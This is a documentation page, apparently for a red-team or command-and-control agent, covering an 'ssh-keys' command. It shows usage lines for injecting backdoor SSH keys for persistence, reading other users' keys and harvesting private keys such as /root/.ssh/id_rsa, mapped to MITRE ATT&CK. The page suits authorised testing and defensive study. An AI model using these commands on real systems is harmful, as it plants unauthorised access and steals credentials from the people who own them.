+++
title = "ssh-keys"
chapter = false
weight = 132
hidden = false
+++

{{% notice info %}}Linux/macOS Only{{% /notice %}}

## Summary

Read or manipulate SSH authorized_keys files for persistence and lateral movement. Can also extract private keys for credential harvesting. Supports targeting other users' `.ssh` directories.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | Yes | list | `list`, `add`, `remove`, or `read-private` |
| key | string | No | - | SSH public key to add, or substring to match for removal |
| user | string | No | current | Target user (reads their `~/.ssh/` directory) |
| path | string | No | - | Override the default authorized_keys or private key path |

## Usage

### List Authorized Keys

List the current user's authorized keys:
```
ssh-keys -action list
```

List another user's keys:
```
ssh-keys -action list -user root
```

### Inject SSH Key (Persistence)

Add a public key for persistent SSH access:
```
ssh-keys -action add -key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... attacker@c2"
```

Inject into a specific user's authorized_keys (requires write access):
```
ssh-keys -action add -user www-data -key "ssh-rsa AAAA... backdoor"
```

### Remove a Key

Remove a key by matching substring (e.g., comment field):
```
ssh-keys -action remove -key "attacker@c2"
```

### Read Private Keys (Credential Harvesting)

Read all standard private key files (id_rsa, id_ecdsa, id_ed25519, id_dsa):
```
ssh-keys -action read-private
```

Read a specific private key file:
```
ssh-keys -action read-private -path /root/.ssh/id_rsa
```

Read another user's private keys:
```
ssh-keys -action read-private -user admin
```

### Example Output (list)

```
Authorized keys (/home/setup/.ssh/authorized_keys) — 2 key(s):
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... admin@server
ssh-rsa AAAAB3NzaC1yc2EAAAA... backup@vault
```

### Example Output (read-private)

```
Found 1 private key(s):

=== /home/setup/.ssh/id_ed25519 ===
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
-----END OPENSSH PRIVATE KEY-----
```

## MITRE ATT&CK Mapping

- T1098.004 — Account Manipulation: SSH Authorized Keys
- T1552.004 — Unsecured Credentials: Private Keys
